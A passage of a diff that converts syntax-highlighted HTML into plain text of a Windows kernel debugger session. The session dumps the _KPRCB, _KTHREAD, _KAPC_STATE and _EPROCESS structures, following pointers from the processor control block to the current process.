-   <span class="o">+</span><span class="mh">0x4f4</span> <span class="n">CcCopyReadNoWaitMiss</span> <span class="o">:</span> <span class="mi">0</span>
-   <span class="o">+</span><span class="mh">0x4f8</span> <span class="n">KeAlignmentFixupCount</span> <span class="o">:</span> <span class="mi">0</span>
-   <span class="o">+</span><span class="mh">0x4fc</span> <span class="n">KeContextSwitches</span> <span class="o">:</span> <span class="mh">0xabc0</span>
-   <span class="o">+</span><span class="mh">0x500</span> <span class="n">KeDcacheFlushCount</span> <span class="o">:</span> <span class="mi">0</span>
-   <span class="o">+</span><span class="mh">0x504</span> <span class="n">KeExceptionDispatchCount</span> <span class="o">:</span> <span class="mh">0x190</span>
-   <span class="o">+</span><span class="mh">0x508</span> <span class="n">KeFirstLevelTbFills</span> <span class="o">:</span> <span class="mi">0</span>
-   <span class="o">+</span><span class="mh">0x50c</span> <span class="n">KeFloatingEmulationCount</span> <span class="o">:</span> <span class="mi">0</span>
-   <span class="o">+</span><span class="mh">0x510</span> <span class="n">KeIcacheFlushCount</span> <span class="o">:</span> <span class="mi">0</span>
-   <span class="o">+</span><span class="mh">0x514</span> <span class="n">KeSecondLevelTbFills</span> <span class="o">:</span> <span class="mi">0</span>
-   <span class="o">+</span><span class="mh">0x518</span> <span class="n">KeSystemCalls</span>    <span class="o">:</span> <span class="mh">0x92373</span>
-   <span class="o">+</span><span class="mh">0x51c</span> <span class="n">SpareCounter0</span>    <span class="o">:</span> <span class="p">[1]</span> <span class="mi">0</span>
-   <span class="o">+</span><span class="mh">0x520</span> <span class="n">PPLookasideList</span>  <span class="o">:</span> <span class="p">[16]</span> <span class="n">_PP_LOOKASIDE_LIST</span>
-   <span class="o">+</span><span class="mh">0x5a0</span> <span class="n">PPNPagedLookasideList</span> <span class="o">:</span> <span class="p">[32]</span> <span class="n">_PP_LOOKASIDE_LIST</span>
-   <span class="o">+</span><span class="mh">0x6a0</span> <span class="n">PPPagedLookasideList</span> <span class="o">:</span> <span class="p">[32]</span> <span class="n">_PP_LOOKASIDE_LIST</span>
-   <span class="o">+</span><span class="mh">0x7a0</span> <span class="n">PacketBarrier</span>    <span class="o">:</span> <span class="mi">0</span>
-   <span class="o">+</span><span class="mh">0x7a4</span> <span class="n">ReverseStall</span>     <span class="o">:</span> <span class="mi">0</span>
-   <span class="o">+</span><span class="mh">0x7a8</span> <span class="n">IpiFrame</span>         <span class="o">:</span> <span class="p">(</span><span class="n">null</span><span class="p">)</span> 
-   <span class="o">+</span><span class="mh">0x7ac</span> <span class="n">PrcbPad2</span>         <span class="o">:</span> <span class="p">[52]</span>  <span class="s">""</span>
-   <span class="o">+</span><span class="mh">0x7e0</span> <span class="n">CurrentPacket</span>    <span class="o">:</span> <span class="p">[3]</span> <span class="p">(</span><span class="n">null</span><span class="p">)</span> 
-   <span class="o">+</span><span class="mh">0x7ec</span> <span class="n">TargetSet</span>        <span class="o">:</span> <span class="mi">0</span>
-   <span class="o">+</span><span class="mh">0x7f0</span> <span class="n">WorkerRoutine</span>    <span class="o">:</span> <span class="p">(</span><span class="n">null</span><span class="p">)</span> 
-   <span class="o">+</span><span class="mh">0x7f4</span> <span class="n">IpiFrozen</span>        <span class="o">:</span> <span class="mi">0</span>
-   <span class="o">+</span><span class="mh">0x7f8</span> <span class="n">PrcbPad3</span>         <span class="o">:</span> <span class="p">[40]</span>  <span class="s">""</span>
-   <span class="o">+</span><span class="mh">0x820</span> <span class="n">RequestSummary</span>   <span class="o">:</span> <span class="mi">0</span>
-   <span class="o">+</span><span class="mh">0x824</span> <span class="n">SignalDone</span>       <span class="o">:</span> <span class="p">(</span><span class="n">null</span><span class="p">)</span> 
-   <span class="o">+</span><span class="mh">0x828</span> <span class="n">PrcbPad4</span>         <span class="o">:</span> <span class="p">[56]</span>  <span class="s">""</span>
-   <span class="o">+</span><span class="mh">0x860</span> <span class="n">DpcListHead</span>      <span class="o">:</span> <span class="n">_LIST_ENTRY</span> <span class="err">[</span> <span class="mh">0x80552da4</span> <span class="o">-</span> <span class="mh">0x80552da4</span> <span class="err">]</span>
-   <span class="o">+</span><span class="mh">0x868</span> <span class="n">DpcStack</span>         <span class="o">:</span> <span class="mh">0xbacd0000</span> <span class="n">Void</span>
-   <span class="o">+</span><span class="mh">0x86c</span> <span class="n">DpcCount</span>         <span class="o">:</span> <span class="mh">0x1a37</span>
-   <span class="o">+</span><span class="mh">0x870</span> <span class="n">DpcQueueDepth</span>    <span class="o">:</span> <span class="mi">1</span>
-   <span class="o">+</span><span class="mh">0x874</span> <span class="n">DpcRoutineActive</span> <span class="o">:</span> <span class="mi">0</span>
-   <span class="o">+</span><span class="mh">0x878</span> <span class="n">DpcInterruptRequested</span> <span class="o">:</span> <span class="mi">0</span>
-   <span class="o">+</span><span class="mh">0x87c</span> <span class="n">DpcLastCount</span>     <span class="o">:</span> <span class="mh">0x1a37</span>
-   <span class="o">+</span><span class="mh">0x880</span> <span class="n">DpcRequestRate</span>   <span class="o">:</span> <span class="mi">0</span>
-   <span class="o">+</span><span class="mh">0x884</span> <span class="n">MaximumDpcQueueDepth</span> <span class="o">:</span> <span class="mi">1</span>
-   <span class="o">+</span><span class="mh">0x888</span> <span class="n">MinimumDpcRate</span>   <span class="o">:</span> <span class="mi">3</span>
-   <span class="o">+</span><span class="mh">0x88c</span> <span class="n">QuantumEnd</span>       <span class="o">:</span> <span class="mi">0</span>
-   <span class="o">+</span><span class="mh">0x890</span> <span class="n">PrcbPad5</span>         <span class="o">:</span> <span class="p">[16]</span>  <span class="s">""</span>
-   <span class="o">+</span><span class="mh">0x8a0</span> <span class="n">DpcLock</span>          <span class="o">:</span> <span class="mi">0</span>
-   <span class="o">+</span><span class="mh">0x8a4</span> <span class="n">PrcbPad6</span>         <span class="o">:</span> <span class="p">[28]</span>  <span class="s">""</span>
-   <span class="o">+</span><span class="mh">0x8c0</span> <span class="n">CallDpc</span>          <span class="o">:</span> <span class="n">_KDPC</span>
-   <span class="o">+</span><span class="mh">0x8e0</span> <span class="n">ChainedInterruptList</span> <span class="o">:</span> <span class="p">(</span><span class="n">null</span><span class="p">)</span> 
-   <span class="o">+</span><span class="mh">0x8e4</span> <span class="n">LookasideIrpFloat</span> <span class="o">:</span> <span class="mi">0</span><span class="n">n1438</span>
-   <span class="o">+</span><span class="mh">0x8e8</span> <span class="n">SpareFields0</span>     <span class="o">:</span> <span class="p">[6]</span> <span class="mi">0</span>
-   <span class="o">+</span><span class="mh">0x900</span> <span class="n">VendorString</span>     <span class="o">:</span> <span class="p">[13]</span>  <span class="s">"GenuineIntel"</span>
-   <span class="o">+</span><span class="mh">0x90d</span> <span class="n">InitialApicId</span>    <span class="o">:</span> <span class="mi">0</span> <span class="err">''</span>
-   <span class="o">+</span><span class="mh">0x90e</span> <span class="n">LogicalProcessorsPerPhysicalProcessor</span> <span class="o">:</span> <span class="mh">0x1</span> <span class="err">''</span>
-   <span class="o">+</span><span class="mh">0x910</span> <span class="n">MHz</span>              <span class="o">:</span> <span class="mh">0x8da</span>
-   <span class="o">+</span><span class="mh">0x914</span> <span class="n">FeatureBits</span>      <span class="o">:</span> <span class="mh">0xa0013fff</span>
-   <span class="o">+</span><span class="mh">0x918</span> <span class="n">UpdateSignature</span>  <span class="o">:</span> <span class="n">_LARGE_INTEGER</span> <span class="mh">0x0</span>
-   <span class="o">+</span><span class="mh">0x920</span> <span class="n">NpxSaveArea</span>      <span class="o">:</span> <span class="n">_FX_SAVE_AREA</span>
-   <span class="o">+</span><span class="mh">0xb30</span> <span class="n">PowerState</span>       <span class="o">:</span> <span class="n">_PROCESSOR_POWER_STATE</span>
+kd&gt; dt _KPRCB ffdff000+0x120 
+nt!_KPRCB
+   +0x000 MinorVersion     : 1
+   +0x002 MajorVersion     : 1
+   +0x004 CurrentThread    : 0x80552740 _KTHREAD
+   +0x008 NextThread       : (null) 
+   +0x00c IdleThread       : 0x80552740 _KTHREAD
+   +0x010 Number           : 0 ''
+   +0x011 Reserved         : 0 ''
+   +0x012 BuildType        : 2
+   +0x014 SetMember        : 1
+   +0x018 CpuType          : 6 ''
+   +0x019 CpuID            : 1 ''
+   +0x01a CpuStep          : 0x3a09
+   +0x01c ProcessorState   : _KPROCESSOR_STATE
+   +0x33c KernelReserved   : [16] 0
+   +0x37c HalReserved      : [16] 0
+   +0x3bc PrcbPad0         : [92]  ""
+   +0x418 LockQueue        : [16] _KSPIN_LOCK_QUEUE
+   +0x498 PrcbPad1         : [8]  ""
+   +0x4a0 NpxThread        : 0x863a22d0 _KTHREAD
+   +0x4a4 InterruptCount   : 0x352b
+   +0x4a8 KernelTime       : 0x1c0d
+   +0x4ac UserTime         : 0xc8
+   +0x4b0 DpcTime          : 0x22
+   +0x4b4 DebugDpcTime     : 0
+   +0x4b8 InterruptTime    : 0x8a
+   +0x4bc AdjustDpcThreshold : 0x14
+   +0x4c0 PageColor        : 0
+   +0x4c4 SkipTick         : 0
+   +0x4c8 MultiThreadSetBusy : 0 ''
+   +0x4c9 Spare2           : [3]  ""
+   +0x4cc ParentNode       : 0x80552e00 _KNODE
+   +0x4d0 MultiThreadProcessorSet : 1
+   +0x4d4 MultiThreadSetMaster : (null) 
+   +0x4d8 ThreadStartCount : [2] 0
+   +0x4e0 CcFastReadNoWait : 0
+   +0x4e4 CcFastReadWait   : 0
+   +0x4e8 CcFastReadNotPossible : 0
+   +0x4ec CcCopyReadNoWait : 0
+   +0x4f0 CcCopyReadWait   : 0
+   +0x4f4 CcCopyReadNoWaitMiss : 0
+   +0x4f8 KeAlignmentFixupCount : 0
+   +0x4fc KeContextSwitches : 0xabc0
+   +0x500 KeDcacheFlushCount : 0
+   +0x504 KeExceptionDispatchCount : 0x190
+   +0x508 KeFirstLevelTbFills : 0
+   +0x50c KeFloatingEmulationCount : 0
+   +0x510 KeIcacheFlushCount : 0
+   +0x514 KeSecondLevelTbFills : 0
+   +0x518 KeSystemCalls    : 0x92373
+   +0x51c SpareCounter0    : [1] 0
+   +0x520 PPLookasideList  : [16] _PP_LOOKASIDE_LIST
+   +0x5a0 PPNPagedLookasideList : [32] _PP_LOOKASIDE_LIST
+   +0x6a0 PPPagedLookasideList : [32] _PP_LOOKASIDE_LIST
+   +0x7a0 PacketBarrier    : 0
+   +0x7a4 ReverseStall     : 0
+   +0x7a8 IpiFrame         : (null) 
+   +0x7ac PrcbPad2         : [52]  ""
+   +0x7e0 CurrentPacket    : [3] (null) 
+   +0x7ec TargetSet        : 0
+   +0x7f0 WorkerRoutine    : (null) 
+   +0x7f4 IpiFrozen        : 0
+   +0x7f8 PrcbPad3         : [40]  ""
+   +0x820 RequestSummary   : 0
+   +0x824 SignalDone       : (null) 
+   +0x828 PrcbPad4         : [56]  ""
+   +0x860 DpcListHead      : _LIST_ENTRY [ 0x80552da4 - 0x80552da4 ]
+   +0x868 DpcStack         : 0xbacd0000 Void
+   +0x86c DpcCount         : 0x1a37
+   +0x870 DpcQueueDepth    : 1
+   +0x874 DpcRoutineActive : 0
+   +0x878 DpcInterruptRequested : 0
+   +0x87c DpcLastCount     : 0x1a37
+   +0x880 DpcRequestRate   : 0
+   +0x884 MaximumDpcQueueDepth : 1
+   +0x888 MinimumDpcRate   : 3
+   +0x88c QuantumEnd       : 0
+   +0x890 PrcbPad5         : [16]  ""
+   +0x8a0 DpcLock          : 0
+   +0x8a4 PrcbPad6         : [28]  ""
+   +0x8c0 CallDpc          : _KDPC
+   +0x8e0 ChainedInterruptList : (null) 
+   +0x8e4 LookasideIrpFloat : 0n1438
+   +0x8e8 SpareFields0     : [6] 0
+   +0x900 VendorString     : [13]  "GenuineIntel"
+   +0x90d InitialApicId    : 0 ''
+   +0x90e LogicalProcessorsPerPhysicalProcessor : 0x1 ''
+   +0x910 MHz              : 0x8da
+   +0x914 FeatureBits      : 0xa0013fff
+   +0x918 UpdateSignature  : _LARGE_INTEGER 0x0
+   +0x920 NpxSaveArea      : _FX_SAVE_AREA
+   +0xb30 PowerState       : _PROCESSOR_POWER_STATE
 
-<span class="n">kd</span><span class="o">&gt;</span> <span class="kt">dt</span> <span class="n">_KTHREAD</span> <span class="n">poi</span><span class="p">(</span><span class="n">ffdff000</span><span class="o">+</span><span class="mh">0x120</span><span class="o">+</span><span class="mh">0x004</span><span class="p">)</span> 
-<span class="n">nt</span><span class="err">!</span><span class="n">_KTHREAD</span>
-   <span class="o">+</span><span class="mh">0x000</span> <span class="n">Header</span>           <span class="o">:</span> <span class="n">_DISPATCHER_HEADER</span>
-   <span class="o">+</span><span class="mh">0x010</span> <span class="n">MutantListHead</span>   <span class="o">:</span> <span class="n">_LIST_ENTRY</span> <span class="err">[</span> <span class="mh">0x80552750</span> <span class="o">-</span> <span class="mh">0x80552750</span> <span class="err">]</span>
-   <span class="o">+</span><span class="mh">0x018</span> <span class="n">InitialStack</span>     <span class="o">:</span> <span class="mh">0x80549f00</span> <span class="n">Void</span>
-   <span class="o">+</span><span class="mh">0x01c</span> <span class="n">StackLimit</span>       <span class="o">:</span> <span class="mh">0x80546f00</span> <span class="n">Void</span>
-   <span class="o">+</span><span class="mh">0x020</span> <span class="n">Teb</span>              <span class="o">:</span> <span class="p">(</span><span class="n">null</span><span class="p">)</span> 
-   <span class="o">+</span><span class="mh">0x024</span> <span class="n">TlsArray</span>         <span class="o">:</span> <span class="p">(</span><span class="n">null</span><span class="p">)</span> 
-   <span class="o">+</span><span class="mh">0x028</span> <span class="n">KernelStack</span>      <span class="o">:</span> <span class="mh">0x80549c4c</span> <span class="n">Void</span>
-   <span class="o">+</span><span class="mh">0x02c</span> <span class="n">DebugActive</span>      <span class="o">:</span> <span class="mi">0</span> <span class="err">''</span>
-   <span class="o">+</span><span class="mh">0x02d</span> <span class="n">State</span>            <span class="o">:</span> <span class="mh">0x2</span> <span class="err">''</span>
-   <span class="o">+</span><span class="mh">0x02e</span> <span class="n">Alerted</span>          <span class="o">:</span> <span class="p">[2]</span>  <span class="s">""</span>
-   <span class="o">+</span><span class="mh">0x030</span> <span class="n">Iopl</span>             <span class="o">:</span> <span class="mi">0</span> <span class="err">''</span>
-   <span class="o">+</span><span class="mh">0x031</span> <span class="n">NpxState</span>         <span class="o">:</span> <span class="mh">0xa</span> <span class="err">''</span>
-   <span class="o">+</span><span class="mh">0x032</span> <span class="n">Saturation</span>       <span class="o">:</span> <span class="mi">0</span> <span class="err">''</span>
-   <span class="o">+</span><span class="mh">0x033</span> <span class="n">Priority</span>         <span class="o">:</span> <span class="mi">16</span> <span class="err">''</span>
-   <span class="o">+</span><span class="mh">0x034</span> <span class="n">ApcState</span>         <span class="o">:</span> <span class="n">_KAPC_STATE</span>
-   <span class="o">+</span><span class="mh">0x04c</span> <span class="n">ContextSwitches</span>  <span class="o">:</span> <span class="mh">0x1852</span>
-   <span class="o">+</span><span class="mh">0x050</span> <span class="n">IdleSwapBlock</span>    <span class="o">:</span> <span class="mi">0</span> <span class="err">''</span>
-   <span class="o">+</span><span class="mh">0x051</span> <span class="n">Spare0</span>           <span class="o">:</span> <span class="p">[3]</span>  <span class="s">""</span>
-   <span class="o">+</span><span class="mh">0x054</span> <span class="n">WaitStatus</span>       <span class="o">:</span> <span class="mi">0</span><span class="n">n0</span>
-   <span class="o">+</span><span class="mh">0x058</span> <span class="n">WaitIrql</span>         <span class="o">:</span> <span class="mh">0x2</span> <span class="err">''</span>
-   <span class="o">+</span><span class="mh">0x059</span> <span class="n">WaitMode</span>         <span class="o">:</span> <span class="mi">0</span> <span class="err">''</span>
-   <span class="o">+</span><span class="mh">0x05a</span> <span class="n">WaitNext</span>         <span class="o">:</span> <span class="mi">0</span> <span class="err">''</span>
-   <span class="o">+</span><span class="mh">0x05b</span> <span class="n">WaitReason</span>       <span class="o">:</span> <span class="mi">0</span> <span class="err">''</span>
-   <span class="o">+</span><span class="mh">0x05c</span> <span class="n">WaitBlockList</span>    <span class="o">:</span> <span class="p">(</span><span class="n">null</span><span class="p">)</span> 
-   <span class="o">+</span><span class="mh">0x060</span> <span class="n">WaitListEntry</span>    <span class="o">:</span> <span class="n">_LIST_ENTRY</span> <span class="err">[</span> <span class="mh">0x0</span> <span class="o">-</span> <span class="mh">0x0</span> <span class="err">]</span>
-   <span class="o">+</span><span class="mh">0x060</span> <span class="n">SwapListEntry</span>    <span class="o">:</span> <span class="n">_SINGLE_LIST_ENTRY</span>
-   <span class="o">+</span><span class="mh">0x068</span> <span class="n">WaitTime</span>         <span class="o">:</span> <span class="mi">0</span>
-   <span class="o">+</span><span class="mh">0x06c</span> <span class="n">BasePriority</span>     <span class="o">:</span> <span class="mi">0</span> <span class="err">''</span>
-   <span class="o">+</span><span class="mh">0x06d</span> <span class="n">DecrementCount</span>   <span class="o">:</span> <span class="mi">0</span> <span class="err">''</span>
-   <span class="o">+</span><span class="mh">0x06e</span> <span class="n">PriorityDecrement</span> <span class="o">:</span> <span class="mi">0</span> <span class="err">''</span>
-   <span class="o">+</span><span class="mh">0x06f</span> <span class="n">Quantum</span>          <span class="o">:</span> <span class="o">-</span><span class="mi">43</span> <span class="err">''</span>
-   <span class="o">+</span><span class="mh">0x070</span> <span class="n">WaitBlock</span>        <span class="o">:</span> <span class="p">[4]</span> <span class="n">_KWAIT_BLOCK</span>
-   <span class="o">+</span><span class="mh">0x0d0</span> <span class="n">LegoData</span>         <span class="o">:</span> <span class="p">(</span><span class="n">null</span><span class="p">)</span> 
-   <span class="o">+</span><span class="mh">0x0d4</span> <span class="n">KernelApcDisable</span> <span class="o">:</span> <span class="mi">0</span>
-   <span class="o">+</span><span class="mh">0x0d8</span> <span class="n">UserAffinity</span>     <span class="o">:</span> <span class="mh">0xffffffff</span>
-   <span class="o">+</span><span class="mh">0x0dc</span> <span class="n">SystemAffinityActive</span> <span class="o">:</span> <span class="mi">0</span> <span class="err">''</span>
-   <span class="o">+</span><span class="mh">0x0dd</span> <span class="n">PowerState</span>       <span class="o">:</span> <span class="mi">0</span> <span class="err">''</span>
-   <span class="o">+</span><span class="mh">0x0de</span> <span class="n">NpxIrql</span>          <span class="o">:</span> <span class="mi">0</span> <span class="err">''</span>
-   <span class="o">+</span><span class="mh">0x0df</span> <span class="n">InitialNode</span>      <span class="o">:</span> <span class="mi">0</span> <span class="err">''</span>
-   <span class="o">+</span><span class="mh">0x0e0</span> <span class="n">ServiceTable</span>     <span class="o">:</span> <span class="mh">0x80552fa0</span> <span class="n">Void</span>
-   <span class="o">+</span><span class="mh">0x0e4</span> <span class="n">Queue</span>            <span class="o">:</span> <span class="p">(</span><span class="n">null</span><span class="p">)</span> 
-   <span class="o">+</span><span class="mh">0x0e8</span> <span class="n">ApcQueueLock</span>     <span class="o">:</span> <span class="mi">0</span>
-   <span class="o">+</span><span class="mh">0x0f0</span> <span class="n">Timer</span>            <span class="o">:</span> <span class="n">_KTIMER</span>
-   <span class="o">+</span><span class="mh">0x118</span> <span class="n">QueueListEntry</span>   <span class="o">:</span> <span class="n">_LIST_ENTRY</span> <span class="err">[</span> <span class="mh">0x0</span> <span class="o">-</span> <span class="mh">0x0</span> <span class="err">]</span>
-   <span class="o">+</span><span class="mh">0x120</span> <span class="n">SoftAffinity</span>     <span class="o">:</span> <span class="mi">1</span>
-   <span class="o">+</span><span class="mh">0x124</span> <span class="n">Affinity</span>         <span class="o">:</span> <span class="mi">1</span>
-   <span class="o">+</span><span class="mh">0x128</span> <span class="n">Preempted</span>        <span class="o">:</span> <span class="mi">0</span> <span class="err">''</span>
-   <span class="o">+</span><span class="mh">0x129</span> <span class="n">ProcessReadyQueue</span> <span class="o">:</span> <span class="mi">0</span> <span class="err">''</span>
-   <span class="o">+</span><span class="mh">0x12a</span> <span class="n">KernelStackResident</span> <span class="o">:</span> <span class="mh">0x1</span> <span class="err">''</span>
-   <span class="o">+</span><span class="mh">0x12b</span> <span class="n">NextProcessor</span>    <span class="o">:</span> <span class="mi">0</span> <span class="err">''</span>
-   <span class="o">+</span><span class="mh">0x12c</span> <span class="n">CallbackStack</span>    <span class="o">:</span> <span class="p">(</span><span class="n">null</span><span class="p">)</span> 
-   <span class="o">+</span><span class="mh">0x130</span> <span class="n">Win32Thread</span>      <span class="o">:</span> <span class="p">(</span><span class="n">null</span><span class="p">)</span> 
-   <span class="o">+</span><span class="mh">0x134</span> <span class="n">TrapFrame</span>        <span class="o">:</span> <span class="p">(</span><span class="n">null</span><span class="p">)</span> 
-   <span class="o">+</span><span class="mh">0x138</span> <span class="n">ApcStatePointer</span>  <span class="o">:</span> <span class="p">[2]</span> <span class="mh">0x80552774</span> <span class="n">_KAPC_STATE</span>
-   <span class="o">+</span><span class="mh">0x140</span> <span class="n">PreviousMode</span>     <span class="o">:</span> <span class="mi">0</span> <span class="err">''</span>
-   <span class="o">+</span><span class="mh">0x141</span> <span class="n">EnableStackSwap</span>  <span class="o">:</span> <span class="mh">0x1</span> <span class="err">''</span>
-   <span class="o">+</span><span class="mh">0x142</span> <span class="n">LargeStack</span>       <span class="o">:</span> <span class="mi">0</span> <span class="err">''</span>
-   <span class="o">+</span><span class="mh">0x143</span> <span class="n">ResourceIndex</span>    <span class="o">:</span> <span class="mi">0</span> <span class="err">''</span>
-   <span class="o">+</span><span class="mh">0x144</span> <span class="n">KernelTime</span>       <span class="o">:</span> <span class="mh">0x1858</span>
-   <span class="o">+</span><span class="mh">0x148</span> <span class="n">UserTime</span>         <span class="o">:</span> <span class="mi">0</span>
-   <span class="o">+</span><span class="mh">0x14c</span> <span class="n">SavedApcState</span>    <span class="o">:</span> <span class="n">_KAPC_STATE</span>
-   <span class="o">+</span><span class="mh">0x164</span> <span class="n">Alertable</span>        <span class="o">:</span> <span class="mi">0</span> <span class="err">''</span>
-   <span class="o">+</span><span class="mh">0x165</span> <span class="n">ApcStateIndex</span>    <span class="o">:</span> <span class="mi">0</span> <span class="err">''</span>
-   <span class="o">+</span><span class="mh">0x166</span> <span class="n">ApcQueueable</span>     <span class="o">:</span> <span class="mh">0x1</span> <span class="err">''</span>
-   <span class="o">+</span><span class="mh">0x167</span> <span class="n">AutoAlignment</span>    <span class="o">:</span> <span class="mi">0</span> <span class="err">''</span>
-   <span class="o">+</span><span class="mh">0x168</span> <span class="n">StackBase</span>        <span class="o">:</span> <span class="mh">0x80549f00</span> <span class="n">Void</span>
-   <span class="o">+</span><span class="mh">0x16c</span> <span class="n">SuspendApc</span>       <span class="o">:</span> <span class="n">_KAPC</span>
-   <span class="o">+</span><span class="mh">0x19c</span> <span class="n">SuspendSemaphore</span> <span class="o">:</span> <span class="n">_KSEMAPHORE</span>
-   <span class="o">+</span><span class="mh">0x1b0</span> <span class="n">ThreadListEntry</span>  <span class="o">:</span> <span class="n">_LIST_ENTRY</span> <span class="err">[</span> <span class="mh">0x805529f0</span> <span class="o">-</span> <span class="mh">0x805529f0</span> <span class="err">]</span>
-   <span class="o">+</span><span class="mh">0x1b8</span> <span class="n">FreezeCount</span>      <span class="o">:</span> <span class="mi">0</span> <span class="err">''</span>
-   <span class="o">+</span><span class="mh">0x1b9</span> <span class="n">SuspendCount</span>     <span class="o">:</span> <span class="mi">0</span> <span class="err">''</span>
-   <span class="o">+</span><span class="mh">0x1ba</span> <span class="n">IdealProcessor</span>   <span class="o">:</span> <span class="mi">0</span> <span class="err">''</span>
-   <span class="o">+</span><span class="mh">0x1bb</span> <span class="n">DisableBoost</span>     <span class="o">:</span> <span class="mi">0</span> <span class="err">''</span>
+kd&gt; dt _KTHREAD poi(ffdff000+0x120+0x004) 
+nt!_KTHREAD
+   +0x000 Header           : _DISPATCHER_HEADER
+   +0x010 MutantListHead   : _LIST_ENTRY [ 0x80552750 - 0x80552750 ]
+   +0x018 InitialStack     : 0x80549f00 Void
+   +0x01c StackLimit       : 0x80546f00 Void
+   +0x020 Teb              : (null) 
+   +0x024 TlsArray         : (null) 
+   +0x028 KernelStack      : 0x80549c4c Void
+   +0x02c DebugActive      : 0 ''
+   +0x02d State            : 0x2 ''
+   +0x02e Alerted          : [2]  ""
+   +0x030 Iopl             : 0 ''
+   +0x031 NpxState         : 0xa ''
+   +0x032 Saturation       : 0 ''
+   +0x033 Priority         : 16 ''
+   +0x034 ApcState         : _KAPC_STATE
+   +0x04c ContextSwitches  : 0x1852
+   +0x050 IdleSwapBlock    : 0 ''
+   +0x051 Spare0           : [3]  ""
+   +0x054 WaitStatus       : 0n0
+   +0x058 WaitIrql         : 0x2 ''
+   +0x059 WaitMode         : 0 ''
+   +0x05a WaitNext         : 0 ''
+   +0x05b WaitReason       : 0 ''
+   +0x05c WaitBlockList    : (null) 
+   +0x060 WaitListEntry    : _LIST_ENTRY [ 0x0 - 0x0 ]
+   +0x060 SwapListEntry    : _SINGLE_LIST_ENTRY
+   +0x068 WaitTime         : 0
+   +0x06c BasePriority     : 0 ''
+   +0x06d DecrementCount   : 0 ''
+   +0x06e PriorityDecrement : 0 ''
+   +0x06f Quantum          : -43 ''
+   +0x070 WaitBlock        : [4] _KWAIT_BLOCK
+   +0x0d0 LegoData         : (null) 
+   +0x0d4 KernelApcDisable : 0
+   +0x0d8 UserAffinity     : 0xffffffff
+   +0x0dc SystemAffinityActive : 0 ''
+   +0x0dd PowerState       : 0 ''
+   +0x0de NpxIrql          : 0 ''
+   +0x0df InitialNode      : 0 ''
+   +0x0e0 ServiceTable     : 0x80552fa0 Void
+   +0x0e4 Queue            : (null) 
+   +0x0e8 ApcQueueLock     : 0
+   +0x0f0 Timer            : _KTIMER
+   +0x118 QueueListEntry   : _LIST_ENTRY [ 0x0 - 0x0 ]
+   +0x120 SoftAffinity     : 1
+   +0x124 Affinity         : 1
+   +0x128 Preempted        : 0 ''
+   +0x129 ProcessReadyQueue : 0 ''
+   +0x12a KernelStackResident : 0x1 ''
+   +0x12b NextProcessor    : 0 ''
+   +0x12c CallbackStack    : (null) 
+   +0x130 Win32Thread      : (null) 
+   +0x134 TrapFrame        : (null) 
+   +0x138 ApcStatePointer  : [2] 0x80552774 _KAPC_STATE
+   +0x140 PreviousMode     : 0 ''
+   +0x141 EnableStackSwap  : 0x1 ''
+   +0x142 LargeStack       : 0 ''
+   +0x143 ResourceIndex    : 0 ''
+   +0x144 KernelTime       : 0x1858
+   +0x148 UserTime         : 0
+   +0x14c SavedApcState    : _KAPC_STATE
+   +0x164 Alertable        : 0 ''
+   +0x165 ApcStateIndex    : 0 ''
+   +0x166 ApcQueueable     : 0x1 ''
+   +0x167 AutoAlignment    : 0 ''
+   +0x168 StackBase        : 0x80549f00 Void
+   +0x16c SuspendApc       : _KAPC
+   +0x19c SuspendSemaphore : _KSEMAPHORE
+   +0x1b0 ThreadListEntry  : _LIST_ENTRY [ 0x805529f0 - 0x805529f0 ]
+   +0x1b8 FreezeCount      : 0 ''
+   +0x1b9 SuspendCount     : 0 ''
+   +0x1ba IdealProcessor   : 0 ''
+   +0x1bb DisableBoost     : 0 ''
 
-<span class="n">kd</span><span class="o">&gt;</span> <span class="kt">dt</span> <span class="n">_KAPC_STATE</span> <span class="n">poi</span><span class="p">(</span><span class="n">ffdff000</span><span class="o">+</span><span class="mh">0x120</span><span class="o">+</span><span class="mh">0x004</span><span class="p">)</span><span class="o">+</span><span class="mh">0x034</span> 
-<span class="n">nt</span><span class="err">!</span><span class="n">_KAPC_STATE</span>
-   <span class="o">+</span><span class="mh">0x000</span> <span class="n">ApcListHead</span>      <span class="o">:</span> <span class="p">[2]</span> <span class="n">_LIST_ENTRY</span> <span class="err">[</span> <span class="mh">0x80552774</span> <span class="o">-</span> <span class="mh">0x80552774</span> <span class="err">]</span>
-   <span class="o">+</span><span class="mh">0x010</span> <span class="n">Process</span>          <span class="o">:</span> <span class="mh">0x805529a0</span> <span class="n">_KPROCESS</span>
-   <span class="o">+</span><span class="mh">0x014</span> <span class="n">KernelApcInProgress</span> <span class="o">:</span> <span class="mi">0</span> <span class="err">''</span>
-   <span class="o">+</span><span class="mh">0x015</span> <span class="n">KernelApcPending</span> <span class="o">:</span> <span class="mi">0</span> <span class="err">''</span>
-   <span class="o">+</span><span class="mh">0x016</span> <span class="n">UserApcPending</span>   <span class="o">:</span> <span class="mi">0</span> <span class="err">''</span>
+kd&gt; dt _KAPC_STATE poi(ffdff000+0x120+0x004)+0x034 
+nt!_KAPC_STATE
+   +0x000 ApcListHead      : [2] _LIST_ENTRY [ 0x80552774 - 0x80552774 ]
+   +0x010 Process          : 0x805529a0 _KPROCESS
+   +0x014 KernelApcInProgress : 0 ''
+   +0x015 KernelApcPending : 0 ''
+   +0x016 UserApcPending   : 0 ''
 
-<span class="n">kd</span><span class="o">&gt;</span> <span class="kt">dt</span> <span class="n">_EPROCESS</span> <span class="n">poi</span><span class="p">(</span><span class="n">ffdff000</span><span class="o">+</span><span class="mh">0x120</span><span class="o">+</span><span class="mh">0x004</span><span class="p">)</span><span class="o">+</span><span class="mh">0x034</span><span class="o">+</span><span class="mh">0x10</span> 
-<span class="n">nt</span><span class="err">!</span><span class="n">_EPROCESS</span>
-   <span class="o">+</span><span class="mh">0x000</span> <span class="n">Pcb</span>              <span class="o">:</span> <span class="n">_KPROCESS</span>
-   <span class="o">+</span><span class="mh">0x06c</span> <span class="n">ProcessLock</span>      <span class="o">:</span> <span class="n">_EX_PUSH_LOCK</span>
-   <span class="o">+</span><span class="mh">0x070</span> <span class="n">CreateTime</span>       <span class="o">:</span> <span class="n">_LARGE_INTEGER</span> <span class="mh">0x80552838</span><span class="err">`</span><span class="mi">00000000</span>
-   <span class="o">+</span><span class="mh">0x078</span> <span class="n">ExitTime</span>         <span class="o">:</span> <span class="n">_LARGE_INTEGER</span> <span class="mh">0x80552740</span><span class="err">`</span><span class="mi">80552838</span>
